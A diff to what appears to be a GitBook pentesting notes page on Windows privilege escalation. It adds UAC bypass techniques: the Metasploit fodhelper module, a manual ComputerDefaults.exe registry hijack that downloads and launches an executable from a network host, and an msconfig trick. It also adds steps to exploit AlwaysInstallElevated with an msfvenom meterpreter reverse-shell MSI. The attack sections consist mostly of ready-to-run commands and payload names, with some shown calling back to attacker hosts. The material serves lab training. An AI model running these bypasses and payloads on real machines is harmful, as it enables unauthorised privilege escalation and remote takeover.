@@ -248,21 +248,17 @@ robocopy /B C:\Secret .\ imp.txt
 
 <figure><img src="../../.gitbook/assets/image (1900).png" alt=""><figcaption></figcaption></figure>
 
-## Abusing UAC&#x20;
-
-{% hint style="info" %}
-_Need to update this. Don't know exactly how this happens. Just reproduced the exact steps from HTB. Contact creator if this content is not updated._&#x20;
-{% endhint %}
+## Abusing UAC
 
 ### Confirming UAC is enabled&#x20;
 
 {% code overflow="wrap" %}
 ```cmd
- REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
+ REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1973).png" alt=""><figcaption></figcaption></figure>
 
 ### Checking UAC Level&#x20;
 
@@ -281,53 +277,80 @@ REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1974).png" alt=""><figcaption></figcaption></figure>
 
-### Check Windows Version
+### Automated Bypass with bypassuac\_fodhelper
 
-{% hint style="danger" %}
-_From here on, we'll switch to an HTB vulnerable machine to demonstrate UAC bypass techniques._
+{% hint style="warning" %}
+_The user must be a member of the **Local Administrators** group on the Windows machine._
 {% endhint %}
 
-UAC bypasses leverage flaws or unintended functionality in different Windows builds. Let's examine the build of Windows we're looking to elevate on.
+The Metasploit Module  `exploit/windows/local/bypassuac_fodhelper` abuses the Windows Features-On-Demand helper (fodhelper.exe). Because `fodhelper` auto-elevates and queries the per-user registry hive for its file-association command, an attacker who plants a custom command under HKCU\Software\Classes\ms-settings\Shell\Open\command achieves silent elevation when the binary launches.
 
-{% code overflow="wrap" %}
-```powershell
-[environment]::OSVersion.Version
-```
-{% endcode %}
-
-<figure><img src="../../.gitbook/assets/image (1901).png" alt=""><figcaption></figcaption></figure>
-
-### Escalating Privileges&#x20;
-
-{% code overflow="wrap" %}
+{% code overflow="wrap" expandable="true" %}
 ```bash
- msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
+use exploit/windows/local/bypassuac_fodhelper
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (1902).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1975).png" alt=""><figcaption></figcaption></figure>
 
-#### Testing Normal Connection&#x20;
+<figure><img src="../../.gitbook/assets/image (1976).png" alt=""><figcaption></figcaption></figure>
 
-{% code overflow="wrap" %}
-```cmd
-rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
+<figure><img src="../../.gitbook/assets/image (1977).png" alt=""><figcaption></figcaption></figure>
+
+**Useful payloads**&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```
+windows/shell_reverse_tcp
+windows/shell_bind_tcp 
+windows/meterpreter/reverse_https
+windows/meterpreter/reverse_http
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (1903).png" alt=""><figcaption></figcaption></figure>
+### Other Useful Metasploit Module&#x20;
 
-We can see normal user's rights.&#x20;
-
-{% code overflow="wrap" %}
-```cmd
-C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
+{% code overflow="wrap" expandable="true" %}
+```
+windows/local/bypassuac_injection_winsxs
+exploit/windows/local/bypassuac_sdclt
+exploit/windows/local/bypassuac_silentcleanup
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (1904).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1978).png" alt=""><figcaption></figcaption></figure>
+
+### Manual UAC Bypass via ComputerDefaults.exe&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```
+wget http://192.168.1.17/new.exe -o C:\Users\arjun\Desktop\new.exe
+New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -force
+New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -force
+Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\Users\arjun\Desktop\new.exe" -force
+Start-Process "C:\Windows\System32\ComputerDefaults.exe"
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1980).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (1979).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (1981).png" alt=""><figcaption></figcaption></figure>
+
+### Manual UAC Bypass via msconfig&#x20;
+
+right now we've this minimal privileges.&#x20;
+
+<figure><img src="../../.gitbook/assets/image (1984).png" alt=""><figcaption></figcaption></figure>
+
+Using `msconfig` ⇒ `Tools` ⇒ `Select Command Prompt` ⇒ `Launch`. Thus using msconfig utility we're able to execute elevated shell.
+
+<figure><img src="../../.gitbook/assets/image (1982).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (1983).png" alt=""><figcaption></figcaption></figure>
 
 ## Weak Permissions
 
@@ -1584,6 +1607,81 @@ python3 wes.py systeminfo.txt
 <figure><img src="../../.gitbook/assets/image (1955).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (1956).png" alt=""><figcaption></figcaption></figure>
+
+## Abusing Registry AlwaysInstallElevated
+
+### Understanding AlwaysInstallElevated
+
+`AlwaysInstallElevated` is a **Windows Installer policy misconfiguration** that can lead to **local privilege escalation**. Normally, installing software that requires elevated privileges should require an administrator/UAC approval. With this misconfiguration, Windows is explicitly configured to allow certain MSI installations to run elevated.
+
+<details>
+
+<summary><strong>Create the vulnerable environment</strong></summary>
+
+## Enable AlwaysInstallElevated
+
+### Set AlwaysInstallElevated Across Computer
+
+{% code overflow="wrap" expandable="true" %}
+```cmd
+reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1963).png" alt=""><figcaption></figcaption></figure>
+
+### **Set AlwaysInstallElevated for Specific User (Required):**
+
+{% code overflow="wrap" expandable="true" %}
+```cmd
+reg add "HKEY_USERS\S-1-5-21-3961120578-3141309858-2889632052-1002\Software\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1971).png" alt=""><figcaption></figcaption></figure>
+
+### **Enable Policy**
+
+Navigate to `Local Security Policy > Computer Configuration > Administrative Templates > Windows Components > Windows Installer > Always Install with elevated Privileges`
+
+<figure><img src="../../.gitbook/assets/image (1969).png" alt=""><figcaption></figcaption></figure>
+
+</details>
+
+### Exploiting Registry AlwaysInstallElevated
+
+#### Enumerate and Confirm the vulnerability&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```cmd
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1964).png" alt=""><figcaption></figcaption></figure>
+
+{% code overflow="wrap" expandable="true" %}
+```
+reg query "HKCU\Software\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1972).png" alt=""><figcaption></figcaption></figure>
+
+#### Create Payload and Deliver&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.10.128 lport=8888 -f msi -o setup.msi
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1968).png" alt=""><figcaption></figcaption></figure>
+
+#### Exploit
+
+<figure><img src="../../.gitbook/assets/image (1966).png" alt=""><figcaption></figcaption></figure>
 
 ## Automated Tools&#x20;
 
